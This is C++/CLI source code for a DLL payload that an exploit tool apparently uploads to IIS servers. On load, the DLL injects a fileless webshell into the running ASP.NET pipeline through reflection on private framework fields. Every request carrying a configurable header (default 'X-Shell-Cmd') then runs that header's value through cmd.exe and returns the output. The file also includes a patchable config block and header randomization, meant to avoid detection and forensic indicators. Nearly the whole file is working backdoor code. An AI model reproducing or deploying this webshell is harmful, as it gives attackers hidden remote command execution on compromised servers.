// payload_inmemory.c — IJW mixed-mode C++/CLI DLL.
//
// In-memory webshell variant. Instead of writing shell.aspx to the web root,
// this payload injects a custom IHttpModule into the running ASP.NET HTTP
// pipeline by reflecting into HttpApplicationFactory and splicing a handler
// into every existing SyncEventExecutionStep in the IIS integrated pipeline.
//
// No file is written to the web root. The shell lives entirely in managed
// heap memory and is lost when the app pool recycles.
//
// Entry flow:
//   DllMain(DLL_PROCESS_ATTACH)               [native, loader lock held]
//     CreateThread(ShellThreadProc)           [native, exits DllMain cleanly]
//       Sleep(500ms)                          [wait for postback to complete]
//       DoInject()                            [managed, loader lock released]
//         reflect: HttpRuntime._theApplicationFactory
//         reflect: HttpApplicationFactory._freeList
//         for each HttpApplication in freeList:
//           ContentModule::Init(app)          [subscribes to events]
//           PatchExistingSteps(app, ...)      [splices handler into IIS steps]
//         retry up to 200x if freeList empty
//
// Request handling (post-injection):
//   GET /any/path HTTP/1.1
//   X-Shell-Cmd: <command>   (default header name; patchable via config block)
//
//   The handler checks every inbound request for the configured header.
//   If absent the request passes through untouched.
//   If present, cmd.exe is spawned, stdout+stderr written as text/plain.
//
// Patchable config block (native .data section):
//   Magic  "TSECPLD\0" at g_cfg[0..7] — used by the exploit tool to locate
//   the block in the uploaded binary without recompiling.
//
//   g_cfg[8]       debug flag  — 0 = off (default, no file I/O at all),
//                                non-zero = on (writes log entries to log path)
//   g_cfg[16..47]  cmd header  — null-terminated, 32-byte field, max 31
//                                printable ASCII chars. Default: "X-Shell-Cmd".
//   g_cfg[48..111] log path    — null-terminated, 64-byte field, max 63 ASCII
//                                chars. Only written when debug flag is on.
//                                Default: "C:\Windows\Temp\dbg.txt".
//
//   Exploit tool flags (applied in-memory before upload; no recompile needed):
//     -debug-shell               set debug flag to 1
//     -shell-header <name>       override cmd header (1-31 printable ASCII chars,
//                                no spaces, no colon; validated before upload)
//     -shell-logpath <path>      override log path (1-63 ASCII chars)
//
//   When -shell-mode inmemory is used without -shell-header, the exploit tool
//   auto-generates "X-<random>" using the same random substring it uses to
//   rename the assembly, so every upload uses a different header name.
//   The generated header is persisted in the state file for resume.
//
// Constraints:
//   - DllMain holds the Windows loader lock. Managed code must not be called
//     from DllMain. CreateThread escapes this.
//   - No CRT. Assembly.LoadFrom bypasses _DllMainCRTStartup. All native string
//     operations use kernel32 exports only.
//   - No GetFileAttributesW or FindFirstFile in native context.

#include <windows.h>
#include <mscoree.h>
#include <metahost.h>

// ---- Patchable config block -------------------------------------------------
//
// Layout (128 bytes total):
//   [0..7]    8-byte magic "TSECPLD\0"
//   [8]       debug flag: 0 = off, non-zero = on
//   [9..15]   reserved (7 bytes)
//   [16..47]  cmd header name, null-terminated (32 bytes)
//   [48..111] log path, null-terminated (64 bytes)
//   [112..127] reserved (16 bytes)
//
// The exploit tool searches the DLL bytes for the magic and patches in-place
// before upload. No recompile needed to change these values.

#pragma unmanaged

static volatile unsigned char g_cfg[128] = {
    /* [0..7]   magic "TSECPLD\0" */
    'T','S','E','C','P','L','D',0,
    /* [8]      debug flag: 0 = off, non-zero = on */
    0,
    /* [9..15]  reserved */
    0,0,0,0,0,0,0,
    /* [16..47] cmd header name, null-terminated, 32 bytes */
    'X','-','S','h','e','l','l','-','C','m','d',0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    /* [48..111] log path, null-terminated, 64 bytes */
    'C',':','\\','W','i','n','d','o','w','s','\\','T','e','m','p','\\','d','b','g','.','t','x','t',0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,
    /* [112..127] reserved */
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
};

static int         DbgEnabled() { return g_cfg[8]; }
static const char* CmdHeader()  { return (const char*)(g_cfg + 16); }
static const char* LogPath()    { return (const char*)(g_cfg + 48); }

// ---- Native diagnostic helper ----------------------------------------------
//
// Appends one line to the diagnostic log using only kernel32 calls.
// No-op when debug flag is off.

static void DiagNative(const char* msg) {
    if (!DbgEnabled()) return;
    HANDLE h = CreateFileA(LogPath(),
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    DWORD w;
    WriteFile(h, msg, (DWORD)lstrlenA(msg), &w, NULL);
    WriteFile(h, "\r\n", 2, &w, NULL);
    CloseHandle(h);
}

// Forward-declare the managed injection entry point.
#pragma managed
void DoInject();
#pragma unmanaged

// ---- Domain-targeted injection callback ------------------------------------

static HRESULT STDMETHODCALLTYPE InjectionCallback(void* cookie) {
    DiagNative("InjectionCallback: in correct domain, calling DoInject");
    DoInject();
    return S_OK;
}

// ---- Thread proc and DllMain -----------------------------------------------

static DWORD WINAPI ShellThreadProc(LPVOID) {
    Sleep(500);
    DiagNative("injection thread: enumerating CLR app domains");

    ICLRMetaHost* pMetaHost = NULL;
    HRESULT hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (void**)&pMetaHost);
    if (FAILED(hr)) {
        DiagNative("CLRCreateInstance(ICLRMetaHost) failed — falling back");
        goto fallback;
    }

    {
        IEnumUnknown* pRuntimes = NULL;
        hr = pMetaHost->EnumerateLoadedRuntimes(GetCurrentProcess(), &pRuntimes);
        pMetaHost->Release();
        if (FAILED(hr) || !pRuntimes) {
            DiagNative("EnumerateLoadedRuntimes failed — falling back");
            goto fallback;
        }

        IUnknown* pRt = NULL;
        ULONG fetched = 0;
        pRuntimes->Next(1, &pRt, &fetched);
        pRuntimes->Release();
        if (!pRt) {
            DiagNative("no runtime found — falling back");
            goto fallback;
        }

        ICLRRuntimeInfo* pRtInfo = NULL;
        hr = pRt->QueryInterface(IID_ICLRRuntimeInfo, (void**)&pRtInfo);
        pRt->Release();
        if (FAILED(hr)) {
            DiagNative("QI ICLRRuntimeInfo failed — falling back");
            goto fallback;
        }

        ICLRRuntimeHost* pHost = NULL;
        hr = pRtInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (void**)&pHost);
        pRtInfo->Release();
        if (FAILED(hr)) {
            DiagNative("GetInterface ICLRRuntimeHost failed — falling back");
            goto fallback;
        }

        BOOL injected = FALSE;
        for (DWORD id = 2; id <= 10; id++) {
            char msg[] = "trying ExecuteInAppDomain id= ";
            msg[sizeof(msg)-2] = (id < 10) ? (char)('0' + id) : '?';
            DiagNative(msg);
            hr = pHost->ExecuteInAppDomain(id, InjectionCallback, NULL);
            if (SUCCEEDED(hr)) {
                DiagNative("ExecuteInAppDomain succeeded");
                injected = TRUE;
                break;
            }
        }
        pHost->Release();

        if (injected) return 0;
        DiagNative("ExecuteInAppDomain exhausted — falling back to current domain");
    }

fallback:
    DiagNative("fallback: calling DoInject on current thread");
    DoInject();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID lp) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        DiagNative("DllMain: creating injection thread");
        CreateThread(NULL, 0, ShellThreadProc, NULL, 0, NULL);
    }
    return TRUE;
}

// ---- Managed section -------------------------------------------------------

#pragma managed

#using <System.dll>
#using <System.Web.dll>

using namespace System;
using namespace System::Web;
using namespace System::Collections;
using namespace System::ComponentModel;
using namespace System::Diagnostics;
using namespace System::Reflection;
using namespace System::Threading;

// ---- In-memory shell module ------------------------------------------------

ref class ContentModule : public IHttpModule {
    // Per-request guard key. Using an Object^ avoids any string literal IOC.
    static initonly Object^ s_handled = gcnew Object();

    // Lazy-cached managed copy of the cmd header name from the config block.
    // Populated on first request; never changes after DLL load.
    static String^ s_cmdHeader = nullptr;

    static String^ CmdHeaderStr() {
        if (s_cmdHeader == nullptr)
            s_cmdHeader = gcnew String(CmdHeader());
        return s_cmdHeader;
    }

    static String^ RunCmd(String^ cmd) {
        Process^ p = gcnew Process();
        p->StartInfo->FileName               = "cmd.exe";
        p->StartInfo->Arguments              = "/c " + cmd;
        p->StartInfo->UseShellExecute        = false;
        p->StartInfo->RedirectStandardOutput = true;
        p->StartInfo->RedirectStandardError  = true;
        p->StartInfo->CreateNoWindow         = true;
        p->Start();
        String^ out = p->StandardOutput->ReadToEnd() + p->StandardError->ReadToEnd();
        p->WaitForExit();
        return out;
    }

public:
    virtual void Init(HttpApplication^ app) {
        app->BeginRequest += gcnew EventHandler(this, &ContentModule::OnShellEvent);
        app->EndRequest   += gcnew EventHandler(this, &ContentModule::OnShellEvent);
    }

    void OnShellEvent(Object^ sender, EventArgs^ e) {
        HttpApplication^ app = safe_cast<HttpApplication^>(sender);
        HttpContext^     ctx = app->Context;

        // Guard: fire at most once per request across all spliced steps.
        if (ctx->Items[s_handled] != nullptr) return;

        String^ cmd = ctx->Request->Headers[CmdHeaderStr()];
        if (String::IsNullOrEmpty(cmd)) return;

        ctx->Items[s_handled] = s_handled;

        if (DbgEnabled()) {
            try {
                IO::File::AppendAllText(gcnew String(LogPath()),
                    "FIRE " + DateTime::Now.ToString("HH:mm:ss.fff") + "\r\n");
            } catch (...) {}
        }

        try { ctx->Response->ClearContent(); } catch (...) {}
        try { ctx->Response->ClearHeaders(); } catch (...) {}
        ctx->Response->StatusCode  = 200;
        ctx->Response->ContentType = "text/plain";
        ctx->Response->Write(RunCmd(cmd));
        try { ctx->ApplicationInstance->CompleteRequest(); } catch (...) {}
    }

    ~ContentModule() {}
};

// ---- Managed diagnostic helper ---------------------------------------------

static void DiagManaged(String^ msg) {
    if (!DbgEnabled()) return;
    try {
        IO::File::AppendAllText(
            gcnew String(LogPath()),
            msg + Environment::NewLine);
    } catch (...) {}
}

// ---- Step patching ---------------------------------------------------------
//
// In IIS 7+ integrated pipeline, each module has SyncEventExecutionStep objects
// in its PipelineModuleStepContainer. Each step captures its event-handler
// delegate at AddEventMapping time (during InitInternal) — post-init additions
// to _events are invisible to those steps.
//
// This function splices ourHandler into every step's _handler field via
// Delegate::Combine. The s_handled guard in the handler prevents double-execution
// when our handler fires across multiple steps per request.

static int PatchExistingSteps(HttpApplication^ app, Assembly^ systemWeb, EventHandler^ ourHandler) {
    int patched = 0;
    try {
        FieldInfo^ containerArrayField = HttpApplication::typeid->GetField(
            "_moduleContainers", BindingFlags::NonPublic | BindingFlags::Instance);
        if (!containerArrayField) { DiagManaged("Patch: _moduleContainers field not found"); return 0; }
        Object^ containerArrayObj = containerArrayField->GetValue(app);
        if (!containerArrayObj) { DiagManaged("Patch: _moduleContainers is null"); return 0; }
        Array^ containers = dynamic_cast<Array^>(containerArrayObj);
        if (!containers) { DiagManaged("Patch: _moduleContainers is not Array"); return 0; }
        DiagManaged("Patch: " + containers->Length + " containers");

        Type^ stepType = systemWeb->GetType("System.Web.HttpApplication+SyncEventExecutionStep");
        if (!stepType) {
            for each (Type^ t in systemWeb->GetTypes()) {
                if (t->Name == "SyncEventExecutionStep") { stepType = t; break; }
            }
        }
        if (!stepType) { DiagManaged("Patch: SyncEventExecutionStep type not found"); return 0; }
        DiagManaged("Patch: step type = " + stepType->FullName);

        FieldInfo^ handlerField = nullptr;
        for each (FieldInfo^ f in stepType->GetFields(BindingFlags::NonPublic | BindingFlags::Instance)) {
            if (Delegate::typeid->IsAssignableFrom(f->FieldType)) {
                handlerField = f;
                DiagManaged("Patch: handler field = " + f->Name + " [" + f->FieldType->Name + "]");
                break;
            }
        }
        if (!handlerField) {
            for each (FieldInfo^ f in stepType->GetFields(BindingFlags::NonPublic | BindingFlags::Instance)) {
                DiagManaged("Patch: StepField " + f->Name + " [" + f->FieldType->Name + "]");
            }
            DiagManaged("Patch: no Delegate field found in step type");
            return 0;
        }

        for (int ci = 0; ci < containers->Length; ci++) {
            Object^ container = containers->GetValue(ci);
            if (!container) continue;

            Type^ ct = container->GetType();
            if (ci == 0) {
                for each (FieldInfo^ f in ct->GetFields(BindingFlags::NonPublic | BindingFlags::Instance)) {
                    DiagManaged("Patch: ContainerField[0] " + f->Name + " [" + f->FieldType->Name + "]");
                }
            }

            for each (FieldInfo^ cf in ct->GetFields(BindingFlags::NonPublic | BindingFlags::Instance)) {
                Object^ fieldVal = nullptr;
                try { fieldVal = cf->GetValue(container); } catch (...) { continue; }
                if (!fieldVal) continue;

                // Case A: direct IEnumerable of step objects
                IEnumerable^ en = dynamic_cast<IEnumerable^>(fieldVal);
                if (en) {
                    for each (Object^ stepObj in en) {
                        if (!stepObj) continue;
                        if (!stepType->IsAssignableFrom(stepObj->GetType())) continue;
                        try {
                            Delegate^ existing = safe_cast<Delegate^>(handlerField->GetValue(stepObj));
                            if (existing) {
                                handlerField->SetValue(stepObj,
                                    Delegate::Combine(existing, safe_cast<Delegate^>(ourHandler)));
                                patched++;
                            }
                        } catch (...) {}
                    }
                }

                // Case B: Array whose elements are IEnumerable of step objects
                Array^ arr = dynamic_cast<Array^>(fieldVal);
                if (arr) {
                    for (int ai = 0; ai < arr->Length; ai++) {
                        Object^ elem = nullptr;
                        try { elem = arr->GetValue(ai); } catch (...) { continue; }
                        if (!elem) continue;
                        IEnumerable^ subEn = dynamic_cast<IEnumerable^>(elem);
                        if (!subEn) continue;
                        for each (Object^ stepObj in subEn) {
                            if (!stepObj) continue;
                            if (!stepType->IsAssignableFrom(stepObj->GetType())) continue;
                            try {
                                Delegate^ existing = safe_cast<Delegate^>(handlerField->GetValue(stepObj));
                                if (existing) {
                                    handlerField->SetValue(stepObj,
                                        Delegate::Combine(existing, safe_cast<Delegate^>(ourHandler)));
                                    patched++;
                                }
                            } catch (...) {}
                        }
                    }
                }
            }
        }
        DiagManaged("Patch: total steps patched = " + patched);
    } catch (Exception^ ex) {
        DiagManaged("PatchExistingSteps error: " + ex->Message);
    }
    return patched;
}

// ---- Pool injection --------------------------------------------------------

static int InjectIntoPool(Assembly^ systemWeb, Type^ factoryType, Object^ factory) {
    try {
        FieldInfo^ lockField = HttpApplication::typeid->GetField(
            "_initInternalCompleted",
            BindingFlags::NonPublic | BindingFlags::Instance);
        FieldInfo^ keyField = HttpApplication::typeid->GetField(
            "_currentModuleCollectionKey",
            BindingFlags::NonPublic | BindingFlags::Instance);
        FieldInfo^ mcField = HttpApplication::typeid->GetField(
            "_moduleCollection",
            BindingFlags::NonPublic | BindingFlags::Instance);

        if (!lockField) { DiagManaged("FATAL: _initInternalCompleted not found"); return 0; }
        if (!keyField)  { DiagManaged("FATAL: _currentModuleCollectionKey not found"); return 0; }
        if (!mcField)   { DiagManaged("FATAL: _moduleCollection not found"); return 0; }

        FieldInfo^ freeListField = factoryType->GetField(
            "_freeList", BindingFlags::NonPublic | BindingFlags::Instance);
        if (!freeListField) { DiagManaged("_freeList field not found"); return 0; }
        FieldInfo^ specialFreeListField = factoryType->GetField(
            "_specialFreeList", BindingFlags::NonPublic | BindingFlags::Instance);

        Object^ flObj  = freeListField->GetValue(factory);
        Object^ sflObj = specialFreeListField ? specialFreeListField->GetValue(factory) : nullptr;

        int flCount=-1, sflCount=-1;
        if (flObj)  { PropertyInfo^ p = flObj->GetType()->GetProperty("Count");  if (p) flCount  = safe_cast<int>(p->GetValue(flObj));  }
        if (sflObj) { PropertyInfo^ p = sflObj->GetType()->GetProperty("Count"); if (p) sflCount = safe_cast<int>(p->GetValue(sflObj)); }
        DiagManaged(String::Format("fl.Count={0} sfl.Count={1}", flCount, sflCount));

        int total = 0;
        array<Object^>^ bags     = gcnew array<Object^>(2) { flObj, sflObj };
        array<String^>^ bagNames = gcnew array<String^>(2) { "_freeList", "_specialFreeList" };

        for (int bi = 0; bi < 2; bi++) {
            Object^ bag = bags[bi];
            if (!bag) continue;
            System::Collections::IEnumerable^ en = dynamic_cast<System::Collections::IEnumerable^>(bag);
            if (!en) { DiagManaged(bagNames[bi] + ": not IEnumerable"); continue; }

            int bagTotal = 0;
            for each (Object^ item in en) {
                HttpApplication^ app = dynamic_cast<HttpApplication^>(item);
                if (!app) continue;

                String^ borrowedKey = nullptr;
                try {
                    HttpModuleCollection^ mc =
                        safe_cast<HttpModuleCollection^>(mcField->GetValue(app));
                    if (mc) {
                        array<String^>^ allKeys = mc->AllKeys;
                        if (allKeys && allKeys->Length > 0) borrowedKey = allKeys[0];
                    }
                } catch (...) {}

                if (!borrowedKey) {
                    DiagManaged(bagNames[bi] + ": no module key found, skipping");
                    continue;
                }

                bool savedLock = false;
                bool didUnlock = false;
                String^ savedKey = nullptr;
                try {
                    savedLock = safe_cast<bool>(lockField->GetValue(app));
                    savedKey  = safe_cast<String^>(keyField->GetValue(app));
                    if (savedLock) { lockField->SetValue(app, false); didUnlock = true; }
                    keyField->SetValue(app, borrowedKey);
                } catch (...) {}

                ContentModule^ mod = gcnew ContentModule();
                EventHandler^ ourHandler = gcnew EventHandler(mod, &ContentModule::OnShellEvent);
                try {
                    mod->Init(app);
                    bagTotal++;
                    DiagManaged(bagNames[bi] + " Init OK, key=" + borrowedKey
                        + " integrated=" + HttpRuntime::UsingIntegratedPipeline);

                    int nPatched = PatchExistingSteps(app, systemWeb, ourHandler);
                    DiagManaged(bagNames[bi] + " PatchExistingSteps: patched " + nPatched + " steps");
                } catch (Exception^ ex) {
                    DiagManaged(bagNames[bi] + " Init threw: " + ex->Message);
                } finally {
                    try {
                        if (didUnlock) lockField->SetValue(app, true);
                        keyField->SetValue(app, savedKey);
                    } catch (...) {}
                }
            }
            DiagManaged(String::Format("{0}: injected {1} instance(s)", bagNames[bi], bagTotal));
            total += bagTotal;
        }

        DiagManaged(String::Format("InjectIntoPool done, total={0}", total));
        return total;

    } catch (Exception^ ex) {
        DiagManaged("InjectIntoPool exception: " + ex->Message);
        return 0;
    }
}

// Entry point called from ShellThreadProc or from the managed module initializer.
void DoInject() {
    DiagManaged(String::Format("DoInject: domain id={0} name={1}",
        AppDomain::CurrentDomain->Id,
        AppDomain::CurrentDomain->FriendlyName));

    Assembly^ systemWeb = Assembly::GetAssembly(HttpRuntime::typeid);
    Type^ factoryType   = systemWeb->GetType("System.Web.HttpApplicationFactory");
    Type^ appType       = systemWeb->GetType("System.Web.HttpApplication");

    // Strategy 1: RegisterModule — registers for all future HttpApplication instances.
    if (appType) {
        MethodInfo^ regMod = nullptr;
        for each (MethodInfo^ m in appType->GetMethods(
                BindingFlags::Public | BindingFlags::Static)) {
            if (m->Name == "RegisterModule" && m->GetParameters()->Length == 1) {
                regMod = m; break;
            }
        }
        if (regMod) {
            try {
                array<Object^>^ regArgs = gcnew array<Object^>(1) { ContentModule::typeid };
                regMod->Invoke(nullptr, regArgs);
                DiagManaged("RegisterModule: SUCCESS");
                return;
            } catch (Exception^ ex) {
                DiagManaged("RegisterModule: failed: " + ex->Message);
                if (ex->InnerException)
                    DiagManaged("  inner: " + ex->InnerException->Message);
            }
        } else {
            DiagManaged("RegisterModule: method not found");
        }
    }

    // Strategy 2: poll the free list and patch existing steps.
    if (!factoryType) {
        DiagManaged("HttpApplicationFactory type not found");
        return;
    }

    FieldInfo^ factoryField = factoryType->GetField(
        "_theApplicationFactory",
        BindingFlags::NonPublic | BindingFlags::Static);
    if (!factoryField) {
        DiagManaged("_theApplicationFactory field not found");
        return;
    }

    FieldInfo^ maxField = factoryType->GetField(
        "_maxFreeSpecialAppInstances",
        BindingFlags::NonPublic | BindingFlags::Static);
    if (maxField) DiagManaged("_maxFreeSpecialAppInstances=" + maxField->GetValue(nullptr));

    const int MAX_ATTEMPTS   = 200;
    const int RETRY_DELAY_MS = 100;

    for (int i = 0; i < MAX_ATTEMPTS; i++) {
        Object^ factory = factoryField->GetValue(nullptr);
        if (!factory) {
            DiagManaged(String::Format("attempt {0}: factory null, retrying", i + 1));
            Thread::Sleep(RETRY_DELAY_MS);
            continue;
        }
        int n = InjectIntoPool(systemWeb, factoryType, factory);
        if (n > 0) {
            DiagManaged(String::Format("injected into {0} app instance(s)", n));
            return;
        }
        DiagManaged(String::Format("attempt {0}/{1}: pool empty, retrying in {2}ms",
            i + 1, MAX_ATTEMPTS, RETRY_DELAY_MS));
        Thread::Sleep(RETRY_DELAY_MS);
    }
    DiagManaged("injection failed: free lists remained empty");
}
